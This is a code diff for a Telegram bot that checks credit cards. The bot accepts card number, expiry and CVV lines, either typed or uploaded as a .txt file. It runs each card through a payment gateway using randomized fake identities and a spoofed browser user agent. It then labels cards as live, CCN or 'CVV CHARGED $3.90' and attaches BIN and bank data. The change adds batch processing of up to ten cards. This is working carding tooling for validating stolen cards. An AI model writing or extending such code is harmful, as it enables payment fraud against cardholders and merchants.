@@ -41,11 +41,9 @@ const addresses = [
 const randomEmails = ['jhefvrix', 'shawnph', 'testuser', 'fireflybuyer', 'user99x'];
 const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
 
-bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const lista = match[1].trim();
+// Helper function para i-process ang isang CC
+async function processCard(lista) {
     const startTime = Date.now();
-
     const parts = lista.split(/[:|]/);
     const cc = parts[0] || '';
     let mes = parts[1] || '';
@@ -56,23 +54,21 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
         ano = ano.slice(2);
     }
 
-    bot.sendMessage(chatId, `🔍 **Checking Card:** \`${lista}\` ...`, { parse_mode: 'Markdown' });
+    let binData = { brand: 'N/A', type: 'N/A', category: 'N/A', bank: 'N/A', country: 'N/A', emoji: '🌐' };
+    try {
+        const binClean = cc.replace(/\s+/g, '').substring(0, 6);
+        const binRes = await axios.get(`https://lookup.binlist.net/${binClean}`, { timeout: 5000 });
+        if (binRes.data) {
+            binData.brand = binRes.data.brand || 'N/A';
+            binData.type = binRes.data.type ? binRes.data.type.toUpperCase() : 'N/A';
+            binData.category = binRes.data.category ? binRes.data.category.toUpperCase() : 'N/A';
+            binData.bank = binRes.data.bank && binRes.data.bank.name ? binRes.data.bank.name.toUpperCase() : 'N/A';
+            binData.country = binRes.data.country && binRes.data.country.name ? binRes.data.country.name.toUpperCase() : 'N/A';
+            binData.emoji = binRes.data.country && binRes.data.country.emoji ? binRes.data.country.emoji : '🌐';
+        }
+    } catch (err) {}
 
     try {
-        let binData = { brand: 'N/A', type: 'N/A', category: 'N/A', bank: 'N/A', country: 'N/A', emoji: '🌐' };
-        try {
-            const binClean = cc.replace(/\s+/g, '').substring(0, 6);
-            const binRes = await axios.get(`https://lookup.binlist.net/${binClean}`, { timeout: 5000 });
-            if (binRes.data) {
-                binData.brand = binRes.data.brand || 'N/A';
-                binData.type = binRes.data.type ? binRes.data.type.toUpperCase() : 'N/A';
-                binData.category = binRes.data.category ? binRes.data.category.toUpperCase() : 'N/A';
-                binData.bank = binRes.data.bank && binRes.data.bank.name ? binRes.data.bank.name.toUpperCase() : 'N/A';
-                binData.country = binRes.data.country && binRes.data.country.name ? binRes.data.country.name.toUpperCase() : 'N/A';
-                binData.emoji = binRes.data.country && binRes.data.country.emoji ? binRes.data.country.emoji : '🌐';
-            }
-        } catch (err) {}
-
         const jar = new CookieJar();
         const client = wrapper(axios.create({
             jar,
@@ -80,12 +76,6 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
             timeout: 30000,
             validateStatus: () => true
         }));
-
-        let ip = 'Unknown';
-        try {
-            const ipRes = await client.get('https://api64.ipify.org/?format=json');
-            ip = ipRes.data.ip || 'Unknown';
-        } catch (e) {}
 
         const dynamicSess = 'btrhdet07gjosk34' + Math.random().toString(36).substring(2, 7);
         const rfname = firstNames[Math.floor(Math.random() * firstNames.length)];
@@ -176,35 +166,91 @@ bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
 
         const overallTime = ((Date.now() - startTime) / 1000).toFixed(2);
 
-        // Husto a panang-taming ti AVS mismatch kas Live (CVV)
         let chargeType = 'DECLINED';
+        let statusIcon = '❌';
         if (message.toLowerCase().includes('address provided does not match') || message.toLowerCase().includes('avs mismatch')) {
-            chargeType = 'CVV (AVS Mismatch Live)';
-            message = 'The transaction has been declined because of an AVS mismatch. (Live Card)';
+            chargeType = 'CVV (Live / AVS Mismatch)';
+            statusIcon = '✅';
+            message = 'The transaction has been declined because of an AVS mismatch. (Live)';
         } else if (message.toLowerCase().includes('invalid cvv') || message.toLowerCase().includes('insufficient funds')) {
             chargeType = 'CCN';
+            statusIcon = '⚠️';
         } else if (result === 'success') {
             chargeType = 'CVV CHARGED $3.90';
+            statusIcon = '🔥';
         }
 
-        let finalResponse = `┏• CC: \`${lista}\`\n`;
-        finalResponse += `┣• ✅ ${message}\n`;
-        finalResponse += `┣• Charge Type: ${chargeType}\n`;
-        finalResponse += `┣• Gateway: Custom AVS Checker\n`;
-        finalResponse += `┗• Execution Time: ${overallTime} seconds\n\n`;
+        let responseText = `┏• CC: \`${lista}\`\n`;
+        responseText += `┣• ${statusIcon}${message}\n`;
+        responseText += `┣• Charge Type: ${chargeType}\n`;
+        responseText += `┣• Gateway: Custom AVS Checker\n`;
+        responseText += `┗• Execution Time: ${overallTime} seconds\n\n`;
         
-        finalResponse += `┏• BIN DATA\n`;
-        finalResponse += `┣• Bin: \`${cc.substring(0, 6)}\`\n`;
-        finalResponse += `┣• Brand Code: ${binData.brand.toUpperCase()}\n`;
-        finalResponse += `┣• Category: ${binData.category}\n`;
-        finalResponse += `┣• Card Type: ${binData.type}\n`;
-        finalResponse += `┣• Issuing Bank: ${binData.bank}\n`;
-        finalResponse += `┗• Country: ${binData.emoji} -${binData.country}`;
+        responseText += `┏• BIN DATA\n`;
+        responseText += `┣• Bin: \`${cc.substring(0, 6)}\`\n`;
+        responseText += `┣• Brand Code: ${binData.brand.toUpperCase()}\n`;
+        responseText += `┣• Category: ${binData.category}\n`;
+        responseText += `┣• Card Type: ${binData.type}\n`;
+        responseText += `┣• Issuing Bank: ${binData.bank}\n`;
+        responseText += `┗• Country: ${binData.emoji} -${binData.country}`;
 
-        bot.sendMessage(chatId, finalResponse, { parse_mode: 'Markdown' });
-
+        return responseText;
     } catch (error) {
-        bot.sendMessage(chatId, `❌ **Error:** \`${error.message}\``, { parse_mode: 'Markdown' });
+        return `┏• CC: \`${lista}\`\n┗• ❌ Error: ${error.message}`;
+    }
+}
+
+// Handler para sa Text Command (/avs o /g) kasama ang multi-card support (max 10)
+bot.onText(/\/(?:avs|g) (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const inputContent = match[1].trim();
+
+    // Kunin ang bawat linya o hiwalayin gamit ang newline, max 10
+    const lines = inputContent.split('\n').map(l => l.trim()).filter(l => l.length > 0);
+    const cards = lines.slice(0, 10); // Limit sa maximum 10 CCs
+
+    if (cards.length === 0) {
+        return bot.sendMessage(chatId, `⚠️ Please provide at least one card! Format: \`/avs cc|mm|yy|cvv\``, { parse_mode: 'Markdown' });
+    }
+
+    bot.sendMessage(chatId, `🔍 **Checking ${cards.length} card(s)... Please wait.**`, { parse_mode: 'Markdown' });
+
+    for (const card of cards) {
+        const resultMsg = await processCard(card);
+        await bot.sendMessage(chatId, resultMsg, { parse_mode: 'Markdown' });
+    }
+});
+
+// Handler para sa pag-upload ng .txt file (.txt file na may listahan ng CC, max 10)
+bot.on('document', async (msg) => {
+    const chatId = msg.chat.id;
+    const document = msg.document;
+
+    // I-check kung text file ang inupload
+    if (document.mime_type === 'text/plain' || document.file_name.endsWith('.txt')) {
+        try {
+            bot.sendMessage(chatId, `📥 **Downloading and processing file...**`, { parse_mode: 'Markdown' });
+            
+            const fileLink = await bot.getFileLink(document.file_id);
+            const fileRes = await axios.get(fileLink);
+            const fileContent = fileRes.data;
+
+            const lines = fileContent.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
+            const cards = lines.slice(0, 10); // Limit sa maximum 10 CCs
+
+            if (cards.length === 0) {
+                return bot.sendMessage(chatId, `⚠️ The uploaded file is empty or invalid format!`, { parse_mode: 'Markdown' });
+            }
+
+            bot.sendMessage(chatId, `🔍 **Found ${cards.length} card(s) in file. Checking now...**`, { parse_mode: 'Markdown' });
+
+            for (const card of cards) {
+                const resultMsg = await processCard(card);
+                await bot.sendMessage(chatId, resultMsg, { parse_mode: 'Markdown' });
+            }
+        } catch (err) {
+            bot.sendMessage(chatId, `❌ **Error processing file:** \`${err.message}\``, { parse_mode: 'Markdown' });
+        }
     }
 });
 
